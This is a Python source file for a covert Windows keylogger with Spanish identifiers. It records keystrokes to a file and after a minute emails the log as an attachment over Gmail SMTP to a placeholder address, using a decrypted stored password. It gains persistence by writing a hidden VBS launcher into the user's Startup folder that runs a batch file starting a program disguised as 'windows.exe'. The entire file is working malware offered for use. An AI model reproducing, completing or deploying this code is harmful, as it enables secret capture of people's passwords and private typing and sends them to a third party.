import datetime
from pynput.keyboard import Listener
from cryptography.fernet import Fernet

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
import smtplib

import time

import getpass, os

def key_listener():
    
    dt = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    
    file_name = 'keylogger_{}.txt'.format(dt)
    
    file = open(file_name, 'w')
    
    t0 = time.time()
    
    def key_recorder(key):

        key = str(key)

        if key == 'Key.enter':
            file.write('\n')

        elif key == 'Key.space':
            file.write(' ')

        else:
            file.write(key.replace("'", ""))
            
        if time.time()-t0 > 60:
            file.close()
            enviar_email(file_name)
            quit()
    
    with Listener(on_press=key_recorder) as l:
        l.join()


def enviar_email(nombre):
    
    def cargar_key():
        return open('pass.key', 'rb').read()
    
    key = cargar_key()
    
    clave = Fernet(key)
    pass_enc = (open('pass.enc', 'rb').read())
    password = clave.decrypt((pass_enc)).decode()
    
    msg = MIMEMultipart()
    mensaje = 'Regalo'
    
    msg['From'] = 'YOUREMAIL'
    msg['To'] = 'YOUREMAIL'
    msg['Subject'] = 'Tareas'
    
    msg.attach(MIMEText(mensaje, 'plain'))
    
    attachment = open(nombre, 'r')
    
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    p.add_header('Content-Disposition', "attachment; filename= %s" % str(nombre))
    msg.attach(p)
    
    server = smtplib.SMTP('smtp.gmail.com: 587')
    server.starttls()
    server.login(msg['From'], password)
    server.sendmail(msg['From'], msg['To'], msg.as_string())
    server.quit()
    

def mover_fichero():
    USER_NAME = getpass.getuser()
    final_path = 'C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'.format(USER_NAME)
    path_script = os.path.dirname(os.path.abspath(__file__))
    
    with open('open.bat', 'w+') as bat_file:
        bat_file.write('cd "{}"\n'.format(path_script))
        bat_file.write('windows.exe')
    
    with open(final_path+'\\'+"open.vbs", "w+") as vbs_file:
        vbs_file.write('Dim WinScriptHost\n')
        vbs_file.write('Set WinScriptHost = CreateObject("WScript.Shell")\n')
        vbs_file.write('WinScriptHost.Run Chr(34) & "{}\open.bat" & Chr(34), 0\n'.format(path_script))
        vbs_file.write('Dim WinScriptHost = Nothing\n')

if __name__ == '__main__':
    mover_fichero()
    key_listener()
        